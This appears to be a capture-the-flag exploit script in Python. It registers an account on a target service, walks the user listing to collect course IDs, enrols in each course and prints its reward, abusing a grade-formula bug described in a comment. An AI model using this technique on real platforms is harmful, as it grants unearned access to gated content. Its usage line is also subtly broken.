#!/usr/bin/env python3

import sys

from divspl_lib import CheckMachine

if len(sys.argv) < 2:
    print(f'Usage: {sys.argv[1]} host')
    exit(0)

cm = CheckMachine(sys.argv[1])

sess = cm.login(*cm.register())

users = cm.get_user_listing()

got_courses = set()

for user in users:
    relations = cm.get_user_relations(sess, user['id'])
    for rel in relations:
        course_id = rel['course']
        if course_id in got_courses:
            continue
        got_courses.add(course_id)

        cm.enroll_course(sess, course_id, 'P')

        # any course reward is accessible
        # (if course is finished) as if there are no grades for a course
        # as the grade average is 10 due to a bug in the formula
        # in models.py line 51
        print(cm.get_course_reward(sess, course_id))
